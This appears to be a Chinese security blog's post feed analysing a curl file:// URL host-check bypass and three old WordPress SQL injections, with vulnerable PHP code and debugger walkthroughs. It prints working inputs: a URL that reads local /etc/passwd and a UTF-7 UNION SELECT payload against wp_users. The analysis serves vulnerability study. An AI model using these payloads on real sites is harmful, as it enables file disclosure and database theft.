<p>首先<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((<span class="number">2</span> == <span class="built_in">sscanf</span>(data-&gt;change.url, <span class="string">"%15[^:]:%[^\n]"</span>,</div><div class="line">protobuf, path)) &amp;&amp;</div><div class="line">Curl_raw_equal(protobuf, <span class="string">"file"</span>)) &#123;</div><div class="line"><span class="keyword">if</span>(path[<span class="number">0</span>] == <span class="string">'/'</span> &amp;&amp; path[<span class="number">1</span>] == <span class="string">'/'</span>) &#123;</div><div class="line"><span class="comment">/* Allow omitted hostname (e.g. file:/&lt;path&gt;).  This is not strictly</span></div><div class="line"><span class="comment">* speaking a valid file: URL by RFC 1738, but treating file:/&lt;path&gt; as</span></div><div class="line"><span class="comment">* file://localhost/&lt;path&gt; is similar to how other schemes treat missing</span></div><div class="line"><span class="comment">* hostnames.  See RFC 1808. */</span></div><div class="line"></div><div class="line"><span class="comment">/* This cannot be done with strcpy() in a portable manner, since the</span></div><div class="line"><span class="comment">memory areas overlap! */</span></div><div class="line">memmove(path, path + <span class="number">2</span>, <span class="built_in">strlen</span>(path + <span class="number">2</span>)+<span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先可以看curl先取了<code>:</code>符号之前的字符转换成大写之后再和<code>file</code>进行对比.程序猿还在注释里面写了这么一段话.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">`      /* Allow omitted hostname (e.g. file:/&lt;path&gt;).  This is not strictly</div><div class="line">* speaking a valid file: URL by RFC 1738, but treating file:/&lt;path&gt; as</div><div class="line">* file://localhost/&lt;path&gt; is similar to how other schemes treat missing</div><div class="line">* hostnames.  See RFC 1808. */</div></pre></td></tr></table></figure>
<p>程序猿是想兼容RFC1808协议,RFC1808协议里对file协议的规定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">The file URL scheme is used to designate files accessible on a</div><div class="line">particular host computer. This scheme, unlike most other URL schemes,</div><div class="line">does not designate a resource that is universally accessible over the</div><div class="line">Internet.</div><div class="line"></div><div class="line">A file URL takes the form:</div><div class="line"></div><div class="line">file://&lt;host&gt;/&lt;path&gt;</div><div class="line"></div><div class="line">where &lt;host&gt; is the fully qualified domain name of the system on</div><div class="line">which the &lt;path&gt; is accessible, and &lt;path&gt; is a hierarchical</div><div class="line">directory path of the form &lt;directory&gt;/&lt;directory&gt;/.../&lt;name&gt;.</div><div class="line"></div><div class="line">For example, a VMS file</div><div class="line"></div><div class="line">DISK$USER:[MY.NOTES]NOTE123456.TXT</div><div class="line"></div><div class="line">might become</div><div class="line"></div><div class="line">&lt;URL:file://vms.host.edu/disk$user/my/notes/note12345.txt&gt;</div><div class="line"></div><div class="line">As a special case, &lt;host&gt; can be the string &quot;localhost&quot; or the empty</div><div class="line">string; this is interpreted as `the machine from which the URL is</div><div class="line">being interpreted&apos;.</div><div class="line"></div><div class="line">The file URL scheme is unusual in that it does not specify an</div><div class="line">Internet protocol or access method for such files; as such, its</div><div class="line">utility in network protocols between hosts is limited.</div></pre></td></tr></table></figure>
<p>我把程序前一部分的逻辑画了张图</p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/2977385263.png" alt="0BE7BB73-540C-4AC1-9F70-6F10BD2494F7.png"></p>
<p>会发现这个函数把file://{somedomain.com}/etc/passwd<br>上面{}中的所有给忽略掉,而只使用path,即使是别的域名也会最终读取到本地的对应文件中.</p>
<p>所以假设一个情况:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var_dump(parse_url('file://qq.com/etc/passwd'));</div></pre></td></tr></table></figure>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/1348378091.png" alt="EE517382-32FD-49CE-81C5-33DD29C29982.png"></p>
<p>给curl类库执行的话,依旧读取的是本地的/etc/passwd文件</p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/2074501187.png" alt="4E3A034C-90EF-4357-BEE3-8D36DE2D50BB.png"></p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/3229707656.png" alt="3B2DB8AC-DB96-41F2-9FC6-339420C50079.png"></p>
<p>所以可以想象一下一个场景</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$url = $_GET[<span class="string">'url'</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">$info = parse_url($url);</div><div class="line">$host = $info[<span class="string">'host'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($host !== $_SERVER[<span class="string">'HTTP_HOST'</span>])&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"It's not baidu.com!Illegal Host!"</span>;</div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (function_exists(<span class="string">'curl_init'</span>) &amp;&amp; function_exists(<span class="string">'curl_exec'</span>)) &#123;</div><div class="line">$ch = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">$data = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">curl($url);</div></pre></td></tr></table></figure>
<p>如果程序猿对curl访问的host做了限制,其实可以绕过host的限制,继续进行文件读取:sunglasses:</p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/1035969849.png" alt="BCE27DB3-90B1-424C-BC1A-0BC3FC14A937.png"></p>
<p>而回到最一开始的那个问题,如果程序猿单单对url后半部分进行了拼接,没有进行<code>:</code>符号前面的协议判断,是可以通过<code>?</code>号,<code>file://qq.com/etc/passwd?+{user+token}</code>来继续执行文件协议读取.</p>
<p>例子:<br><img src="/old/2017/10/10/Curl类库解析url安全简读/1208036310.png" alt="6ED8C152-EF4C-4E84-9CE1-473309950DE1.png"></p>
<p>如果绕过了host,但是后面有拼接</p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/2857452967.png" alt="A2C1B3F6-89E6-4F1C-B161-3856C3BFAF81.png"></p>
<p>这时候后面加一个<code>?</code>就能把后面的token变为查询参数,不影响文件读取</p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/3384863887.png" alt="BF8EF7FC-B060-43A0-9B4B-88731333F06F.png"></p>
<p>如果拼接了前半部分目前来说,又想使用file协议是无计可施的.</p>
<p>但是你想要用其它协议,没问题.curl如果没有读取到传入curl使用的协议,或者遇到不规范的url.会自行对以下协议进行重组.</p>
<p><img src="/old/2017/10/10/Curl类库解析url安全简读/8006785.png" alt="D2582EA5-08C9-4D82-8145-B32003AFABD9.png"></p>
<p>就是说假如你想使用一个ftp协议来下载东西,但是ftp协议被禁用了.你根据它的判断规则传入一个url.</p>
<p>当在内网的ftp服务器域名前缀是<code>ftp.</code>的情况下libcurl还是会根据你传入的url发起一个ftp请求的.</p>
<p>感觉这题可以出一道题,有一股浓浓的ctf味道.假如说能重组<code>file</code>协议的话,会是一个不得了的大洞呢,可惜了.</p>
]]></content>
      
        <categories>
            
            <category> 源码分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Curl </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Wordpress 2.0.5 - Trackback UTF-7 SQL injection分析]]></title>
      <url>/2017/10/10/WordPress-4/</url>
      <content type="html"><![CDATA[<ul>
<li>影响条件:</li>
<li>程序:WordPress</li>
<li>版本: ?-&gt;2.0.5</li>
<li>严重程度:高危</li>
</ul>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>由于这些漏洞都是在exploit-db上面扒下来的exp,再通过exp的作用来分析程序漏洞.所以有时候exp写的比较让人难以理解,可以通过wireshark抓包来进行分析.</p>
<p>这个漏洞expolit-db里的exp名称是<br><code>WordPress 2.0.5 - Trackback UTF-7 - Remote SQL Injection Exploit</code></p>
<p>由于这个漏洞是注入,可以选择在<strong>wp-includes/wp-db.php</strong>的<strong>print_error()</strong>函数里面下一个断点,OS X里可以使用macGDBp配合MAMP搭建测试环境,很方便.</p>
<a id="more"></a>
<p>我在<strong>print_error()</strong>里下了一个断点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_error</span><span class="params">($str = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">xdebug_break();  <span class="comment">//断点在这里</span></div><div class="line"><span class="keyword">global</span> $EZSQL_ERROR;</div><div class="line"><span class="keyword">if</span> (!$str) $str = mysql_error();</div><div class="line">$EZSQL_ERROR[] =</div><div class="line"><span class="keyword">array</span> (<span class="string">'query'</span> =&gt; <span class="keyword">$this</span>-&gt;last_query, <span class="string">'error_str'</span> =&gt; $str);</div><div class="line"></div><div class="line"><span class="comment">// Is error output turned on or not..</span></div><div class="line"><span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;show_errors ) &#123;</div><div class="line"><span class="comment">// If there is an error then take note of it</span></div><div class="line"><span class="keyword">print</span> <span class="string">"&lt;div id='error'&gt;</span></div><div class="line"><span class="string">&lt;p class='wpdberror'&gt;&lt;strong&gt;WordPress database error:&lt;/strong&gt; [$str]&lt;br /&gt;</span></div><div class="line"><span class="string">&lt;code&gt;$this-&gt;last_query&lt;/code&gt;&lt;/p&gt;</span></div><div class="line"><span class="string">&lt;/div&gt;"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>运行一遍exp<br><img src="/old/2017/10/10/WordPress-4/2806207461.png" alt="03F08447-8CE2-4ED0-8039-BB9CA8797868.png"></p>
<p>可以看到wireshark监听loopback已经抓到了以下的几个http数据包</p>
<p><img src="/old/2017/10/10/WordPress-4/1207562817.png" alt="FA9877B1-45D0-4BF7-949E-B943F7AC4675.png"></p>
<p>在No.82 http数据包中看到了明显的payload<br><img src="/old/2017/10/10/WordPress-4/901122206.png" alt="08E21E8D-45BC-412D-9801-58AC445496C0.png"></p>
<p>将这个数据包放在burp里面重放,回到macGDBp里面查看截断的情况.</p>
<p><img src="/old/2017/10/10/WordPress-4/2356300686.png" alt="B447920E-8011-4A13-83A1-4AB74604614D.png"></p>
<p>$blog_name是可以传入注入语句的参数.</p>
<p>可以看到 $blog_name先是被赋值给了$comment_author之后再被打包传入了wp_new_comment()处理<br><img src="/old/2017/10/10/WordPress-4/4006991493.png" alt="382A7665-8238-441F-818B-703083DEEA9B.png"></p>
<p>再wp_new_comment()函数中调用了一个函数来检测相对应的帖子之前是否有使用过trackback功能评论过,所以进行了数据库查询</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">    <span class="keyword">if</span> ( $wpdb-&gt;get_var($dupe) )</div><div class="line">            <span class="keyword">die</span>( __(<span class="string">'Duplicate comment detected; it looks as though you\'ve already said that!'</span>) );</div></pre></td></tr></table></figure>
<pre><code>其中$dupe的语句就是

<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">                $dupe = <span class="string">"SELECT comment_ID FROM $wpdb-&gt;comments WHERE comment_post_ID = '$comment_post_ID' AND ( comment_author = '$comment_author' "</span>;</div><div class="line">                    <span class="keyword">if</span> ( $comment_author_email )</div><div class="line">                            $dupe .= <span class="string">"OR comment_author_email = '$comment_author_email' "</span>;</div><div class="line">                                $dupe .= <span class="string">") AND comment_content = '$comment_content' LIMIT 1"</span>;</div></pre></td></tr></table></figure>


                    我们可以看到没有经过任何处理的$comment_author就这样进入了sql语句中,进行了数据库的查询.

                    为什么用utf-7就可以注入呢？因为`&apos;`号使用了utf-7编码的话,就绕过了编码函数,如果用utf-8编码的`&apos;`号,会被防注入加上`\`

                    ![7C623354-4EF8-46C3-A6CC-5A1422E24B62.png](http://Johnis.online/usr/uploads/2016/06/2484722904.png)

                    所以我们的payload只要用utf-7编码`&apos;`符号为`+ACc-`,让mb_convert_encoding()函数再解码为`&apos;`号就可以闭合前面的`&apos;`号进行注入了.

                    所以构造的payload是

                    <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">                                +ACc- AND 1=0) UNION <span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> wp_users <span class="keyword">WHERE</span> <span class="keyword">ID</span>=+<span class="keyword">ACc</span><span class="comment">--1+ACc- /*</span></div></pre></td></tr></table></figure>


                    看了一看这个文件的其它最后进入数据库的参数,我发现了`url`这个参数也是可以注入的,最后进入的数据库查询的语句是这个
                    **wp-trackback.php:87行**
                    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">                                $dupe = $wpdb-&gt;get_results(&quot;SELECT * FROM $wpdb-&gt;comments WHERE comment_post_ID = &apos;$comment_post_ID&apos; AND comment_author_url = &apos;$comment_author_url&apos;&quot;);</div></pre></td></tr></table></figure>
</code></pre>]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> WordPress </tag>
            
            <tag> 代码注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WordPress <= 1.5.1.2 - xmlrpc Interface SQL Injection分析]]></title>
      <url>/2017/10/10/WordPress-3/</url>
      <content type="html"><![CDATA[<ul>
<li>影响条件:</li>
<li>程序:WordPress</li>
<li>版本:&lt;= 1.5.1.2</li>
<li>严重程度:高危</li>
</ul>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>想要分析这个漏洞首先要了解<code>xmlrpc</code>的相关知识.</p>
<h3 id="什么是xmlrpc"><a href="#什么是xmlrpc" class="headerlink" title="什么是xmlrpc?"></a>什么是xmlrpc?</h3><p>xml rpc是使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据调用远程的方法。</p>
<p>用wordpress xmlrpc.php的sayHello函数来演示一个例子</p>
<p>发送以下的xmlrpc数据包到wordpress的xmlrpc.php路径上,wordpress就会返回返回一个xmlrpc Response</p>
<a id="more"></a>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /xmlrpc.php HTTP/1.1</div><div class="line">Host: example.com</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Accept-Encoding: gzip, deflate, sdch</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6</div><div class="line">Content-Length: 114</div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"iso-8859-1"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>demo.sayHello<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这是上面一个请求返回的数据包</p>
<p><img src="/old/2017/10/10/WordPress-3/2788845538.png" alt="E31985B9-FD8A-4813-B32E-5A80ABDA8DB9.png"></p>
<p>我们可以看见在<code>&lt;string&gt;&lt;/string&gt;</code>标签中返回了一个<code>Hello!</code></p>
<p>所以想要调用它的过程,只要遵循xmlrpc协议格式,例如以下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;methodCall&gt;</div><div class="line">&lt;methodName&gt;&lt;/methodName&gt;</div><div class="line">&lt;params&gt;</div><div class="line">&lt;param&gt;</div><div class="line">&lt;value&gt;&lt;/value&gt;</div><div class="line">&lt;/param&gt;</div><div class="line">&lt;/params&gt;</div><div class="line">&lt;/methodCall&gt;</div></pre></td></tr></table></figure>
<p>##漏洞分析正文<br>首先根据exp来定位漏洞点</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=\<span class="string">"1.0\"?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>pingback.ping<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">params</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>1'<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://wordpress1.5.1/?p=1#1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></div></pre></td></tr></table></figure>
<p>上面这个xml文件是这个exp最核心的地方,我把原exp中填充payload的地方换成了<code>1&#39;</code></p>
<p>返回了如下数据,在这里可以看到返回数据库的错误提示信息</p>
<p><img src="/old/2017/10/10/WordPress-3/8102779.png" alt="6A97CEB7-6745-48B9-BD52-E90070EC2449.png"></p>
<p>来看一下整个执行流程</p>
<p><img src="/old/2017/10/10/WordPress-3/1573512138.png" alt="8D317E7F-120B-4BC2-94C7-98C5958030AD.png"></p>
<p><code>#8</code>中实例化了<code>wp_xmlrpc_server()</code>类,<code>wp_xmlrpc_server()</code>类是wordpress对IXR库的扩展,里面定义了wordpress xmlprc的API.</p>
<p>从<code>#3</code>开始,流程就进入了wordpress所添加的api －&gt;pingback_ping()中.</p>
<p>参数赋值语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$pagelinkedfrom = $args[0];</div></pre></td></tr></table></figure>
<p>args[0]哪来的?args是class IXR_Message中parse()函数处理之后返回的.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$data = $HTTP_RAW_POST_DATA;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;message = <span class="keyword">new</span> IXR_Message($data);</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;message-&gt;parse()) &#123;</div><div class="line"><span class="keyword">$this</span>-&gt;error(<span class="number">-32700</span>, <span class="string">'parse error. not well formed'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我把上面的代码段给摘录出来,parse()解析了标签里面的内容.</p>
<p>解析出来的内容也就是args[0]直接赋值给了pagelinkedfrom没有经过任何处理直接拼接进了sql语句中.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">        $result = $wpdb-&gt;get_results(<span class="string">"SELECT * FROM $wpdb-&gt;comments WHERE comment_post_ID = '$post_ID' AND comment_author_url = '$pagelinkedfrom'"</span>);</div></pre></td></tr></table></figure>
<pre><code>导致的注入.

如果是导致数据库出错的sql语句可以看见它的内容不在xmlrpc response的标签里面

![A89E1453-DE26-4594-91A5-843C2AA7BF30.png](http://Johnis.online/usr/uploads/2016/06/4217694734.png)

因为调用到`this-&gt;query()`的函数中调用到了一个`$this-&gt;print_error();`函数.

这个函数是当发生数据库错误的时候显示上一条查询的sql语句

<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">        <span class="function"><span class="keyword">function</span> <span class="title">print_error</span><span class="params">($str = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">        <span class="keyword">global</span> $EZSQL_ERROR;</div><div class="line">        <span class="keyword">if</span> (!$str) $str = mysql_error();</div><div class="line">        $EZSQL_ERROR[] =</div><div class="line">        <span class="keyword">array</span> (<span class="string">'query'</span> =&gt; <span class="keyword">$this</span>-&gt;last_query, <span class="string">'error_str'</span> =&gt; $str);</div><div class="line">        </div><div class="line">        <span class="comment">// Is error output turned on or not..</span></div><div class="line">        <span class="keyword">if</span> ( <span class="keyword">$this</span>-&gt;show_errors ) &#123;</div><div class="line">        <span class="comment">// If there is an error then take note of it</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"&lt;div id='error'&gt;</span></div><div class="line"><span class="string">        &lt;p class='wpdberror'&gt;&lt;strong&gt;WordPress database error:&lt;/strong&gt; [$str]&lt;br /&gt;</span></div><div class="line"><span class="string">        &lt;code&gt;$this-&gt;last_query&lt;/code&gt;&lt;/p&gt;</span></div><div class="line"><span class="string">        &lt;/div&gt;"</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>


所以说就是报错语句没有在xml里面的原因了
</code></pre>]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> WordPress </tag>
            
            <tag> 代码注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WordPress <= 1.5.1.1-(wp-includes/functions.php:555)注入]]></title>
      <url>/2017/10/10/WordPress-2/</url>
      <content type="html"><![CDATA[<h1 id="WordPress-lt-1-5-1-1-SQL注入分析"><a href="#WordPress-lt-1-5-1-1-SQL注入分析" class="headerlink" title="WordPress &lt;= 1.5.1.1 - SQL注入分析"></a>WordPress &lt;= 1.5.1.1 - SQL注入分析</h1><ul>
<li>影响条件:</li>
<li>程序:WordPress</li>
<li>版本:&lt;= 1.5.1.1</li>
<li>严重程度:高危</li>
</ul>
<h2 id="简要"><a href="#简要" class="headerlink" title="简要"></a>简要</h2><p>在Wordpress调用模版时候,其功能之一是在右侧显示当前存档的类型,进行对应类型查询的时候没有使用干净的参数导致注入</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先将断点下在问题点追寻处理流程</p>
<p>如下:<br><img src="/old/2017/10/10/WordPress-2/173017871.png" alt="C3110BB5-4E9D-45E1-B40E-3A3E031C4AD2.png"></p>
<a id="more"></a>
<p>这是最后参数被污染之后所处的位置</p>
<p><img src="/old/2017/10/10/WordPress-2/2264877938.png" alt="546EC9F9-E58D-453F-846F-3BDF73FC1D9E.png"></p>
<p>为了理解wordpress的漏洞就要研究wordpress的整个处理流程.</p>
<p>我们可以看到<code>#8</code>中的代码</p>
<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/* Short and sweet */</div><div class="line">define(&apos;WP_USE_THEMES&apos;, true);</div><div class="line">require(&apos;./wp-blog-header.php&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>很简单的两行代码</p>
<p>Short and sweet:grinning:</p>
<p>包含了<code>wp-blog-header.php</code></p>
<p><code>wp-blog-header.php</code>主要进行了一些配置文件的初始化,以及对    <code>GET</code>传入的参数进行了构建。</p>
<p>构建好参数之后经过处理,应用到对应的模板上面.</p>
<p>构建参数在主要是如下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Call query posts to do the work.</span></div><div class="line"></div><div class="line">$posts = &amp;query_posts($query_string);</div></pre></td></tr></table></figure>
<p>query_posts()函数的函数原型,如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">query_posts</span><span class="params">($query)</span> </span>&#123;</div><div class="line"><span class="keyword">global</span> $wp_query;</div><div class="line"><span class="keyword">return</span> $wp_query-&gt;query($query);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>query_posts申明了一个<code>$wp_query</code>的全局变量,这是很重要的一个全局变量.</p>
<p>query()函数原型,如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> &amp;<span class="title">query</span><span class="params">($query)</span> </span>&#123;</div><div class="line"><span class="keyword">$this</span>-&gt;parse_query($query);</div><div class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get_posts();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>query函数做了对参数的解析赋值,之后return调用了一个<code>get_posts()</code>函数这个函数做了很多拼接并进行数据库查询语句的动作.</p>
<p>我还发现了,在<code>#4</code>中的<code>load_template()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_template</span><span class="params">($file)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $posts, $post, $wp_did_header, $wp_did_template_redirect, $wp_query,</div><div class="line">            $wp_rewrite, $wpdb;</div><div class="line">            </div><div class="line">                extract($wp_query-&gt;query_vars);</div><div class="line">                </div><div class="line">                    <span class="keyword">require_once</span>($file);</div><div class="line">                    &#125;</div></pre></td></tr></table></figure>
<pre><code>这里的`extract($wp_query-&gt;query_vars);`貌似是一段废代码,因为`$wp_query-&gt;query_vars`是`NULL`,extract()接受的参数是array.

